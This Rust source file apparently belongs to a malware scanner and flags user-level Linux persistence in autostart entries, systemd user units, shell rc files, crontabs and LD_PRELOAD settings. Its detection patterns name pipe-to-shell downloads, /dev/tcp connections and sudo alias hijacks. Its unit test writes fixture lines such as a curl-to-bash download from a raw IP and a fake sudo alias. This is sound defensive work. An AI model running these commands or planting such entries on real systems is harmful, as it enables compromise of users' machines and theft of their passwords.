//! Checks for the ways malware keeps itself running as a normal user: desktop
//! autostart entries, systemd user units, shell startup files, crontabs and
//! LD_PRELOAD. Findings are always "suspicious" — these files are the user's
//! own configuration and are never quarantined automatically.

use std::path::{Path, PathBuf};
use std::sync::LazyLock;

use regex::Regex;

pub struct Finding {
    pub path: PathBuf,
    pub name: &'static str,
    pub detail: String,
}

struct Pattern {
    name: &'static str,
    re: Regex,
}

fn p(name: &'static str, re: &str) -> Pattern {
    Pattern { name, re: Regex::new(re).expect("persistence regex") }
}

/// Patterns applied to commands that run automatically (Exec lines, cron
/// commands, whole shell rc files).
static COMMAND_PATTERNS: LazyLock<Vec<Pattern>> = LazyLock::new(|| {
    vec![
        p("Qlam.Persistence.PipeToShell", r"(curl|wget)\b[^|\n]*\|\s*(sudo\s+)?(ba|z|da)?sh\b"),
        p("Qlam.Persistence.EncodedCommand", r"base64\s+(-d|--decode)\b[^|\n]*\|\s*(ba|z|da)?sh\b"),
        p("Qlam.Persistence.DevTcp", r"/dev/(tcp|udp)/[^/\s]+/[0-9]+"),
        p("Qlam.Persistence.RunsFromTemp", r#"(^|[\s'"=;(&|])(/tmp|/var/tmp|/dev/shm)/[^\s'";&|)]+"#),
        p("Qlam.Persistence.LdPreload", r"\bLD_PRELOAD\s*="),
    ]
});

/// In shell rc files "/tmp/x" is only interesting when it is being run, not
/// mentioned (TMPDIR=/tmp/..., cd /tmp/...), so rc files use a stricter form.
static RC_TEMP_EXEC: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?m)^\s*(nohup\s+|setsid\s+|exec\s+|\(\s*)?(/tmp|/var/tmp|/dev/shm)/\S+").unwrap()
});

static SUDO_ALIAS: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r#"(?m)^\s*alias\s+sudo\s*=\s*['"]?([^'"\n]*)"#).unwrap());

const RC_FILES: &[&str] = &[
    ".bashrc", ".bash_profile", ".bash_login", ".profile", ".zshrc", ".zprofile", ".zshenv", ".zlogin",
    ".config/fish/config.fish", ".xprofile", ".xinitrc", ".xsessionrc",
];

pub fn check_home(home: &Path, username: Option<&str>) -> Vec<Finding> {
    let mut out = Vec::new();

    for f in list(&home.join(".config/autostart"), "desktop") {
        check_lines(&f, &mut out, |l| l.strip_prefix("Exec="));
    }
    for f in walk_units(&home.join(".config/systemd/user")) {
        check_lines(&f, &mut out, |l| {
            let (k, v) = l.split_once('=')?;
            let k = k.trim();
            (k.starts_with("ExecStart") || k.starts_with("ExecStop")).then_some(v)
        });
    }
    for rc in RC_FILES {
        check_rc(&home.join(rc), &mut out);
    }
    for f in list(&home.join(".config/environment.d"), "conf").into_iter().chain([home.join(".pam_environment")]) {
        if let Ok(text) = read_small(&f) {
            if text.lines().any(|l| l.trim_start().starts_with("LD_PRELOAD")) {
                out.push(Finding { path: f, name: "Qlam.Persistence.LdPreload", detail: "sets LD_PRELOAD for the session".into() });
            }
        }
    }
    if let Some(user) = username {
        let cron = PathBuf::from("/var/spool/cron").join(user);
        check_lines(&cron, &mut out, |l| (!l.trim_start().starts_with('#')).then_some(l));
    }
    out
}

fn check_lines(path: &Path, out: &mut Vec<Finding>, select: impl Fn(&str) -> Option<&str>) {
    let Ok(text) = read_small(path) else { return };
    for line in text.lines() {
        let Some(cmd) = select(line.trim()) else { continue };
        for pat in COMMAND_PATTERNS.iter() {
            if pat.re.is_match(cmd) {
                out.push(Finding { path: path.to_path_buf(), name: pat.name, detail: truncate(cmd) });
                break;
            }
        }
    }
}

fn check_rc(path: &Path, out: &mut Vec<Finding>) {
    let Ok(text) = read_small(path) else { return };
    for pat in COMMAND_PATTERNS.iter().filter(|p| p.name != "Qlam.Persistence.RunsFromTemp") {
        if let Some(m) = pat.re.find(&text) {
            out.push(Finding { path: path.to_path_buf(), name: pat.name, detail: truncate(line_of(&text, m.start())) });
        }
    }
    if let Some(m) = RC_TEMP_EXEC.find(&text) {
        out.push(Finding {
            path: path.to_path_buf(),
            name: "Qlam.Persistence.RunsFromTemp",
            detail: truncate(line_of(&text, m.start())),
        });
    }
    // `alias sudo=...` that runs something other than sudo is the classic way
    // to capture the user's password.
    for c in SUDO_ALIAS.captures_iter(&text) {
        let target = c.get(1).map(|m| m.as_str().trim()).unwrap_or("");
        let first = target.split_whitespace().next().unwrap_or("");
        if !target.is_empty() && first != "sudo" && first != "/usr/bin/sudo" {
            out.push(Finding {
                path: path.to_path_buf(),
                name: "Qlam.Persistence.SudoHijack",
                detail: truncate(c.get(0).unwrap().as_str().trim()),
            });
        }
    }
}

fn line_of(text: &str, at: usize) -> &str {
    let start = text[..at].rfind('\n').map(|i| i + 1).unwrap_or(0);
    let end = text[at..].find('\n').map(|i| at + i).unwrap_or(text.len());
    text[start..end].trim()
}

fn truncate(s: &str) -> String {
    let mut s = s.to_string();
    if s.len() > 200 {
        let mut cut = 200;
        while !s.is_char_boundary(cut) {
            cut -= 1;
        }
        s.truncate(cut);
        s.push('…');
    }
    s
}

/// Config files are small; anything large is not worth parsing here (and is
/// scanned by the engines like any other file).
fn read_small(path: &Path) -> std::io::Result<String> {
    let meta = std::fs::symlink_metadata(path)?;
    if !meta.is_file() || meta.len() > 1024 * 1024 {
        return Err(std::io::Error::other("not a small regular file"));
    }
    Ok(String::from_utf8_lossy(&std::fs::read(path)?).into_owned())
}

fn list(dir: &Path, ext: &str) -> Vec<PathBuf> {
    let Ok(rd) = std::fs::read_dir(dir) else { return Vec::new() };
    rd.flatten().map(|e| e.path()).filter(|p| p.extension().is_some_and(|e| e == ext)).collect()
}

fn walk_units(dir: &Path) -> Vec<PathBuf> {
    let mut out = Vec::new();
    let mut stack = vec![dir.to_path_buf()];
    while let Some(d) = stack.pop() {
        let Ok(rd) = std::fs::read_dir(&d) else { continue };
        for e in rd.flatten() {
            let Ok(ft) = e.file_type() else { continue };
            let path = e.path();
            if ft.is_dir() && out.len() < 1000 {
                stack.push(path);
            } else if ft.is_file() && path.extension().is_some_and(|x| x == "service" || x == "timer") {
                out.push(path);
            }
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn flags_classic_persistence() {
        let dir = std::env::temp_dir().join(format!("qlam-persist-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(dir.join(".config/autostart")).unwrap();
        std::fs::write(dir.join(".config/autostart/x.desktop"), "[Desktop Entry]\nExec=/tmp/.x/kworker\n").unwrap();
        std::fs::write(dir.join(".config/autostart/ok.desktop"), "[Desktop Entry]\nExec=/usr/bin/nextcloud --background\n").unwrap();
        std::fs::write(dir.join(".bashrc"), "export TMPDIR=/tmp/me\nalias ll='ls -l'\nalias sudo='/home/u/.s/sudo'\ncurl -s http://1.2.3.4/a | bash\n").unwrap();
        std::fs::write(dir.join(".zshrc"), "alias sudo='sudo '\ncd /tmp/work\n").unwrap();

        let f = check_home(&dir, None);
        let names: Vec<_> = f.iter().map(|f| (f.path.file_name().unwrap().to_string_lossy().into_owned(), f.name)).collect();
        assert!(names.contains(&("x.desktop".into(), "Qlam.Persistence.RunsFromTemp")), "{names:?}");
        assert!(names.contains(&(".bashrc".into(), "Qlam.Persistence.SudoHijack")), "{names:?}");
        assert!(names.contains(&(".bashrc".into(), "Qlam.Persistence.PipeToShell")), "{names:?}");
        assert!(!names.iter().any(|(f, _)| f == "ok.desktop" || f == ".zshrc"), "{names:?}");
        let _ = std::fs::remove_dir_all(&dir);
    }
}
